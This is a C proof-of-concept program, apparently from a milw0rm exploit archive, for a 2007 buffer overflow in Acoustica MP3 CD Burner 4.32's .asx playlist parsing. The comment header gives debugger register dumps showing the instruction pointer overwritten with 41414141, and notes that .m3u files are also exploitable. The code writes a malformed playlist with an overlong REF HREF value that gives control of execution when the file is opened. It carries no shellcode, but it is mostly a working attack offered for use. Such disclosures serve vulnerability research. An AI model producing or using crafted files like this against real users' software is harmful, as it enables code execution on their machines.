/*
Credit's to n00b for finding this bug and poc..
Acoustica MP3 CD Burner 4.32 local buffer-overflow poc code.
Date : May 31'st 2007       
Tested:On win xp sp 2.

Acoustica Is prone to a buffer-overflow when parasing a .asx playlist file
If you can entice some one to open a specialy crafted .asx play list file it 
is possible to run shell-code.This issue occurs because the applications fail 
to properly check boundaries on user-supplied data before copying it to an 
insufficiently sized memory buffer.If we open it up in olly and pass the 
specially crafted .asx we will see at first we can control the eax registers
also ecx gets overwritten if we pass exception the eip is over written . 
I will try and write a loacal exploit in a few day's.

                        ...\\Debug-info//...
////////////////////////////////////////////////////////////////////////////////
/1.exception
/(63c.3d8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=00127273 ecx=41414141 edx=7fffffff esi=7ffffffe edi=00000800
eip=003392f5 esp=00125f2c ebp=00126184 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
UpdateAllMasterChunks+0x4155: cmp     byte ptr [eax],0      ds:0023:41414141=??
////////////////////////////////////////////////////////////////////////////////
//Eax and ecx are over-wrote with our user suplied data.
////////////////////////////////////////////////////////////////////////////////
/2.exception
/(63c.3d8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=41414141 edx=7c9037d8 esi=00000000 edi=00000000
eip=41414141 esp=00125b5c ebp=00125b7c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??              ???
////////////////////////////////////////////////////////////////////////////////
/As we can see after passing execution to the program we can control the eip.
/we have 4bytes to write to any-where we like.  ***to be continued**
////////////////////////////////////////////////////////////////////////////////

Also 1 more thing .m3u file's are also exploitable but this is a different poc
As .m3u file's we dont control the eip but we do control a few register's.
*/

#include <stdlib.h>
#include <stdio.h>


int main(int argc, char *argv[])
{
	FILE *asx;


 if(argc < 2) {
 
 system("cls");
 printf("\n *************************************************");
 printf("\n *************************************************");
 printf("\n *      Acoustica MP3 CD Burner 0day poc         *");
 printf("\n *************************************************");
 printf("\n *          Special thanks to Str0ke             *");
 printf("\n *************************************************");
 printf("\n *Shout's ~ str0ke ~ c0ntex ~ marsu ~ v9@fakehalo*");
 printf("\n *Date :          May 31'st 2007                 *");
 printf("\n *************************************************");
 printf("\n * Credit's to n00b for finding this bug and poc *");
 printf("\n *************************************************");
 printf("\n    Usage:>   Exploit.asx                         ");
 printf("\n *************************************************");

		return 0;
	}
     
      if(!(asx = fopen(argv[1], "w"))) {
		printf("[+] Error");
		return 0;
	}
 fputs("<ASX VERSION=\x22\x33\x2E\x30\x22\x3E\n", asx);
 fputs("<ENTRY>\n",asx);
 fputs("<TITLE>Acoustica MP3 CD Burner Bof</TITLE>\n",asx);
 fputs("<REF HREF=\x22",asx);
 {
 for (int i=0;i<512;i++) \
 fputs("A", asx);      
 
 for (int i=0;i<512;i++) \
 fputs("A", asx);      
 }
 fputs(".asf\x22\x2F\x3E\n", asx);
 fputs("</ENTRY>\n</ASX>\n", asx);
 fclose(asx);
 printf("File's successfully created");
 printf("\nOpen with Acoustica MP3 CD Burner and eip will become 41414141");
 printf("\nLocal exploit to be wrote in a few day's enjoy");
 return 0;
}

// milw0rm.com [2007-05-31]
